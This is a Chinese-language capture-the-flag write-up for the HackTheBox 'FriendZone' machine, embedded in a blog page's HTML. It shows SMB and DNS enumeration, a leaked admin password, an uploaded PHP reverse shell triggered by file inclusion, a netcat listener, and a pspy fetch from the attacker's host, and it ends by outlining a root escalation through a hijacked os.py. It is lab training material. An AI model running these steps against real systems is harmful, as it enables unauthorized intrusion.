@@ -1,0 +1,764 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：疯狂枚举、SMB信息泄露、TLS 证书主域名泄露、dig axfr 命令获取其他子域、远程文件包含、SMB可读写目录put上次PHP后门、smb-enum-shares.nse脚本使用、pspy64s监控异常进程、Python os.py 包插入反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FriendZone-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/06/FriendZone-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：疯狂枚举、SMB信息泄露、TLS 证书主域名泄露、dig axfr 命令获取其他子域、远程文件包含、SMB可读写目录put上次PHP后门、smb-enum-shares.nse脚本使用、pspy64s监控异常进程、Python os.py 包插入反弹shell">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-06T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-06T16:29:51.147Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>FriendZone-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="FriendZone-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-06 23:50" pubdate>
+          2023年12月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">FriendZone-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：疯狂枚举、SMB信息泄露、TLS 证书主域名泄露、dig axfr 命令获取其他子域、远程文件包含、SMB可读写目录put上次PHP后门、smb-enum-shares.nse脚本使用、pspy64s监控异常进程、Python os.py 包插入反弹shell</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.rffuste.com/2020/12/14/htb-friendzone/</code></p>
+<p>参考链接：官方演练记录</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、首先获取下靶机的IP地址：<strong>10.10.10.123</strong></p>
+<p>2、使用nmap进行端口扫描，看看开放了哪些端口信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.123 | grep ^[0-9] | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)<br><br>┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.123<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 23:49 CST<br>Nmap scan report <span class="hljs-keyword">for</span> friendzone.red (10.10.10.123)<br>Host is up (1.1s latency).<br><br>PORT      STATE  SERVICE        VERSION<br>21/tcp    open   ftp            vsftpd 2.0.8 or later<br>22/tcp    open   tcpwrapped<br>| ssh-hostkey: <br>|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)<br>|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)<br>|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)<br>53/tcp    open   domain         ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)<br>80/tcp    open   http           Apache/2.4.29 (Ubuntu)<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Friend Zone Escape software<br>139/tcp   open   tcpwrapped<br>443/tcp   open   ssl/tcpwrapped<br>| tls-alpn: <br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO<br>| Not valid before: 2018-10-05T21:02:30<br>|_Not valid after:  2018-11-04T21:02:30<br>445/tcp   open   tcpwrapped     Samba smbd 4.7.6-Ubuntu<br>1266/tcp  closed dellpwrappks<br>2551/tcp  closed isg-uda-server<br>9810/tcp  closed unknown<br>18495/tcp closed unknown<br>23689/tcp closed unknown<br>25168/tcp closed unknown<br>26992/tcp closed unknown<br>39015/tcp closed unknown<br>46741/tcp closed unknown<br>49493/tcp closed unknown<br>51741/tcp closed unknown<br>52276/tcp closed unknown<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: -39m56s, deviation: 1h09m08s, median: -1s<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-12-06T15:49:59<br>|_  start_date: N/A<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>|   Computer name: friendzone<br>|   NetBIOS computer name: FRIENDZONE\x00<br>|   Domain name: \x00<br>|   FQDN: friendzone<br>|_  System time: 2023-12-06T17:50:00+02:00<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 74.43 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、查询域名信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ dig axfr friendzone.red @10.10.10.123        <br><br>; &lt;&lt;&gt;&gt; DiG 9.19.17-2~kali1-Kali &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123<br>;; global options: +cmd<br>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br>friendzone.red.         604800  IN      AAAA    ::1<br>friendzone.red.         604800  IN      NS      localhost.<br>friendzone.red.         604800  IN      A       127.0.0.1<br>administrator1.friendzone.red. 604800 IN A      127.0.0.1<br>hr.friendzone.red.      604800  IN      A       127.0.0.1<br>uploads.friendzone.red. 604800  IN      A       127.0.0.1<br>friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<br>;; Query time: 292 msec<br>;; SERVER: 10.10.10.123<span class="hljs-comment">#53(10.10.10.123) (TCP)</span><br>;; WHEN: Wed Dec 06 23:52:36 CST 2023<br>;; XFR size: 8 records (messages 1, bytes 289<br></code></pre></td></tr></table></figure>
+
+<p>4、smb目录枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ enum4linux 10.10.10.123                                                  <br>Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  6 23:53:15 2023<br><br>[+] Attempting to map shares on 10.10.10.123                                                                         <br>//10.10.10.123/print$   Mapping: DENIED Listing: N/A Writing: N/A            <br>//10.10.10.123/Files    Mapping: DENIED Listing: N/A Writing: N/A<br>//10.10.10.123/general  Mapping: OK Listing: OK Writing: N/A<br>//10.10.10.123/Development      Mapping: OK Listing: OK Writing: N/A<br></code></pre></td></tr></table></figure>
+
+<p>5、获取账号密码</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(kali㉿kali-linux<span class="hljs-number">-2022</span><span class="hljs-number">-2</span>)-[~]<br>└─$ smbclient -N \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.123</span>\\general<br>Try <span class="hljs-string">&quot;help&quot;</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> possible commands.<br>smb: \&gt; dir<br>  .                                   D        <span class="hljs-number">0</span>  Thu Jan <span class="hljs-number">17</span> <span class="hljs-number">04</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51</span> <span class="hljs-number">2019</span><br>  ..                                  D        <span class="hljs-number">0</span>  Tue Sep <span class="hljs-number">13</span> <span class="hljs-number">22</span>:<span class="hljs-number">56</span>:<span class="hljs-number">24</span> <span class="hljs-number">2022</span><br>  creds.txt                           N       <span class="hljs-number">57</span>  Wed Oct <span class="hljs-number">10</span> <span class="hljs-number">07</span>:<span class="hljs-number">52</span>:<span class="hljs-number">42</span> <span class="hljs-number">2018</span><br><span class="hljs-built_in">get</span><br>                <span class="hljs-number">3545824</span> blocks <span class="hljs-keyword">of</span> size <span class="hljs-number">1024.</span> <span class="hljs-number">1651384</span> blocks available<br>smb: \&gt; <span class="hljs-built_in">get</span> creds.txt<br>getting <span class="hljs-built_in">file</span> \creds.txt <span class="hljs-keyword">of</span> size <span class="hljs-number">57</span> <span class="hljs-keyword">as</span> creds.txt (<span class="hljs-number">0.0</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">0.0</span> KiloBytes/<span class="hljs-built_in">sec</span>)<br>smb: \&gt; <br><br>┌──(kali㉿kali-linux<span class="hljs-number">-2022</span><span class="hljs-number">-2</span>)-[~/Desktop]<br>└─$ cat creds.txt <br>creds <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> admin THING:<br><br>admin:WORKWORKHhallelujah@<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>6、把前面识别到的子域名纳入到本地hosts中来</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(root㉿kali-linux-<span class="hljs-number">2022</span>-<span class="hljs-number">2</span>)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─# echo <span class="hljs-string">&#x27;10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red&#x27;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br><br></code></pre></td></tr></table></figure>
+
+<p>7、登录后台</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//administrator1.friendzone.red/login.php</span><br><span class="hljs-symbol">admin:</span>WORKWORKHhallelujah@<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>8、发现本地远程文件包含漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp<br></code></pre></td></tr></table></figure>
+
+<p>9、使用nmap脚本 smb-enum-shares.nse 知晓文件共享目录的绝对路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop]<br>└─$ sudo nmap 10.10.10.123 --script smb-enum-shares.nse<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\10.10.10.123\Development: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\Development<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\Files: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files /etc/Files<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\hole<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.10.10.123\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\general: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files<br>|     Users: 1<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\general<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br></code></pre></td></tr></table></figure>
+
+<p>10、使用在可读可写的SMB文件里put上我们的木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~/Desktop/test]<br>└─$ smbclient \\\\10.10.10.123\\Development<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; put php-reverse-shell.php <br>putting file php-reverse-shell.php as \php-reverse-shell.php (6.3 kb/s) (average 6.3 kb/s)<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Thu Dec  7 00:05:14 2023<br>  ..                                  D        0  Tue Sep 13 22:56:24 2022<br>  php-reverse-shell.php               A     5493  Thu Dec  7 00:08:14 2023<br><br>                3545824 blocks of size 1024. 1651372 blocks available<br>smb: \&gt; <br></code></pre></td></tr></table></figure>
+
+<p>12、通过远程文件包含获取初始shell，获取到第一个user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~]<br>└─$ nc -lnvp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.7] from (UNKNOWN) [10.10.10.123] 55900<br>Linux FriendZone 4.15.0-36-generic <span class="hljs-comment">#39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br> 18:10:22 up 37 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.02, 0.01, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@FriendZone:/$ ls -la /home/</span><br><span class="hljs-string">ls -la /home/</span><br><span class="hljs-string">total 12</span><br><span class="hljs-string">drwxr-xr-x  3 root   root   4096 Sep 13  2022 .</span><br><span class="hljs-string">drwxr-xr-x 22 root   root   4096 Sep 13  2022 ..</span><br><span class="hljs-string">drwxr-xr-x  5 friend friend 4096 Sep 13  2022 friend</span><br><span class="hljs-string">www-data@FriendZone:/$ cat /home/friend/user.txt     </span><br><span class="hljs-string">cat /home/friend/user.txt</span><br><span class="hljs-string">4e4755aacc0b3a6b2661a5f51bd2a08a</span><br><span class="hljs-string">www-data@FriendZone:/$ </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>13、省略一部分过程，不解释</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><br>python -m SimpleHTTPServer 8080<br><br>www-data@FriendZone:/etc/Development$ wget http://10.10.14.12:8080/pspy64 pspy64<br><br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64<br><br><span class="hljs-built_in">cat</span> /opt/server_admin/reports.py<br><br>/usr/lib/python2.7/os.py<br></code></pre></td></tr></table></figure>
+
+<p>14、通过 LinEnum 发现我们可以对os.py进行修改权限，在这个文件里输入一个反弹shell 来获取最终的root权限</p>
